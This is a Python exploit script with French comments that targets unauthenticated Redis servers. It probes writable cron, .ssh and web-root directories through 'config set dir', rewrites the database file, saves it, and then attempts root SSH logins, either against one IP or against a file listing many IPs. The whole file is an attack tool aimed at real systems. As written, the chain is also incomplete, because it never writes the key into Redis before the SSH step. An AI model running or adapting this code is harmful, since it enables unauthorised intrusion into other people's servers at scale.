#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nom du code : Gestionnaire de serveurs Redis non authentifiés
Description : Ce code exploite les serveurs Redis non authentifiés pour la sécurité.
              Il cherche des répertoires vulnérables et exécute des commandes via SSH.
Auteur      : ZarTek-Creole
Date        : 06-12-23
Source      :
        - https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
        - http://antirez.com/news/96
        - https://rioasmara.com/2023/04/07/redis-rce-post-exploitation/
        - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
"""

import argparse
import logging
import os
import subprocess
import sys
from typing import List, Tuple


class RedisConfig:
    CLI_PATHS = ['/usr/bin/redis-cli', '/usr/local/bin/redis-cli']
    DEFAULT_PORT = '6379'
    DEFAULT_USER = 'root'
    DEFAULT_SSH_KEY = 'id_ed25519.pub'
    DEFAULT_TIMEOUT = 5
    VULNERABLE_DIRECTORIES = [
        "/var/www/html", "/home/redis/.ssh", "/var/lib/redis/.ssh",
        "/var/spool/cron/crontabs", "/var/spool/cron"
    ]
    REDIS_COMMANDS = [
        'config set dbfilename backup.db',
        'config set dir',
        'config set dbfilename dump.rdb',
        'save'
    ]


class ExitOnErrorHandler(logging.StreamHandler):
    def emit(self, record: logging.LogRecord):
        super().emit(record)  # Permet l'affichage normal du log
        if record.levelno >= logging.ERROR:
            sys.exit(1)


def configure_logging(is_verbose: bool):
    logging.basicConfig(
        format="%(asctime)s - %(levelname)s - %(message)s",
        level=logging.DEBUG if is_verbose else logging.INFO,
        handlers=[ExitOnErrorHandler()]
    )


class RedisServerManager:
    def __init__(
        self,
        ip_address: str,
        port: str = RedisConfig.DEFAULT_PORT,
        user: str = RedisConfig.DEFAULT_USER,
        ssh_key: str = RedisConfig.DEFAULT_SSH_KEY,
        timeout: int = RedisConfig.DEFAULT_TIMEOUT
    ):
        self.ip_address = ip_address
        self.port = port
        self.user = user
        self.ssh_key = ssh_key
        self.ssh_key_private = self._derive_ssh_key_private(ssh_key)
        self.timeout = timeout
        self.directory_path = self._determine_directory_path(user)
        self.binary_redis = self._check_binary()

    @staticmethod
    def _derive_ssh_key_private(ssh_key: str) -> str:
        return ssh_key.rstrip('.pub')

    @staticmethod
    def _determine_directory_path(user: str) -> str:
        return '/root/.ssh/' if user == "root" else f'/home/{user}/.ssh/'

    def _check_binary(self) -> str:
        self._validate_ssh_keys()
        self._validate_ssh_client()
        return self._find_redis_cli()

    def _validate_ssh_keys(self):
        if not os.path.isfile(self.ssh_key) or not os.path.isfile(self.ssh_key_private):
            logging.error("Les clés SSH spécifiées n'existent pas.")
            raise FileNotFoundError(f"Les clés SSH '{self.ssh_key}' et '{self.ssh_key_private}' n'existent pas.")

    @staticmethod
    def _validate_ssh_client():
        try:
            subprocess.run(["ssh", "-V"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError:
            logging.error("Le client SSH n'est pas installé.")
            raise EnvironmentError("Le client SSH n'est pas installé. Veuillez installer un client SSH (ex. : 'apt install openssh-client').")

    def _find_redis_cli(self) -> str:
        for path in RedisConfig.CLI_PATHS:
            if os.path.isfile(path):
                return path
        logging.error("Le client Redis n'est pas installé.")
        raise EnvironmentError("Le client Redis n'est pas installé. Veuillez installer un client Redis (ex. : 'apt install redis-tools').")

    def process_server(self) -> Tuple[bool, str]:
        logging.info(
            f"Tentative de connexion à {self.ip_address}:{self.port} avec l'utilisateur {self.user} et la clé SSH '{self.ssh_key}' "
            f"(timeout {self.timeout} sec) écriture dans {self.directory_path}"
        )
        success, msg = self._find_vulnerable_directory()
        logging.debug(f"Répertoire vulnérable trouvé : {self.directory_path}" if success else msg)
        # if not success:
        #     return False, msg
        return self._execute_redis_commands()

    def _find_vulnerable_directory(self) -> Tuple[bool, str]:
        for directory in RedisConfig.VULNERABLE_DIRECTORIES:
            if self._test_directory(directory):
                self.directory_path = directory
                return True, f"Répertoire vulnérable trouvé : {directory}"
        return False, "Aucun répertoire vulnérable trouvé."

    def _test_directory(self, directory: str) -> bool:
        command = [self.binary_redis, '-h', self.ip_address, '-p', self.port, 'config', 'set', 'dir', directory]
        success, _ = self._execute_command(command)
        return success

    def _execute_redis_commands(self) -> Tuple[bool, str]:
        for cmd in RedisConfig.REDIS_COMMANDS:
            command = [self.binary_redis, '-h', self.ip_address, '-p', str(self.port)] + cmd.split()
            logging.debug(f"Commande Redis _execute_redis_commands : {command}")
            success, message = self._execute_command(command)
            if not success:
                return False, message
        return self._execute_ssh_command()

    def _execute_command(self, command: List[str]) -> Tuple[bool, str]:
        logging.debug(f"Commande Redis _execute_command : {command}")
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout, text=True)
            logging.debug(f"Résultat de la commande Redis _execute_command : {result}")
            return self._check_redis_result(result)

        except subprocess.TimeoutExpired:
            return False, f"Le délai de la commande a expiré après {self.timeout} secondes."
        except Exception as e:
            return False, f"Erreur : {str(e)}"

    def _check_redis_result(self, result: subprocess.CompletedProcess) -> Tuple[bool, str]:
        if result.returncode != 0:
            return False, result.stderr.strip()
        return True, "Commande exécutée avec succès."

    def _execute_ssh_command(self) -> Tuple[bool, str]:
        ssh_command = self._build_ssh_command()
        logging.debug(f"Commande SSH : {ssh_command}")
        try:
            result = subprocess.run(ssh_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=self.timeout)
            if result.returncode == 0:
                return True, "Commande SSH exécutée avec succès."
            else:
                return False, f"Échec de la commande SSH : {result.stderr.decode().strip()}"
        except subprocess.TimeoutExpired:
            return False, "Le délai d'exécution de la commande SSH a expiré."
        except Exception as e:
            return False, f"Erreur de connexion SSH : {str(e)}"

    def _build_ssh_command(self) -> str:
        return f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout={self.timeout} -o PasswordAuthentication=no -i {self.ssh_key} {self.user}@{self.ip_address}"


def process_file(file_path: str, port: str, user: str, ssh_key: str, timeout: int):
    with open(file_path, "r") as file:
        for ip_address in file:
            ip_address = ip_address.strip()
            if ip_address:
                manager = RedisServerManager(ip_address, port, user, ssh_key, timeout)
                success, message = manager.process_server()
                logging.info(f"IP {ip_address} - Résultat : {success}, Message : {message}")


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Gestionnaire de serveurs Redis non authentifiés", formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-i', '--ip', help="Adresse IP du serveur Redis")
    parser.add_argument('-f', '--file', help="Chemin du fichier contenant les adresses IP")
    parser.add_argument('-p', '--port', type=int, default=RedisConfig.DEFAULT_PORT, help="Port du serveur Redis")
    parser.add_argument('-u', '--user', default=RedisConfig.DEFAULT_USER, help="Utilisateur SSH pour la connexion")
    parser.add_argument('-s', '--sshKey', default=RedisConfig.DEFAULT_SSH_KEY, help="Chemin du fichier de clé SSH")
    parser.add_argument('-t', '--timeout', type=int, default=RedisConfig.DEFAULT_TIMEOUT, help="Délai de connexion")
    parser.add_argument('-v', '--verbose', action='store_true', help="Augmenter la verbosité des logs")
    args = parser.parse_args()

    if not (args.ip or args.file):
        parser.print_help()
        sys.exit(1)

    return args


def main():
    args = parse_arguments()
    configure_logging(args.verbose)
    if not (args.ip or args.file):
        logging.warning("Aucune adresse IP ou chemin de fichier spécifié. "
                        "Utilisez l'option '--ip' pour spécifier une adresse IP ou "
                        "'-f' pour spécifier un fichier contenant des adresses IP. "
                        "Utilisez '--help' pour plus d'informations.")
    elif args.ip:
        manager = RedisServerManager(args.ip, args.port, args.user, args.sshKey, args.timeout)
        success, message = manager.process_server()
        logging.info(f"IP {args.ip} - Résultat : {success}, Message : {message}")
    else:
        process_file(args.file, args.port, args.user, args.sshKey, args.timeout)


if __name__ == "__main__":
    main()
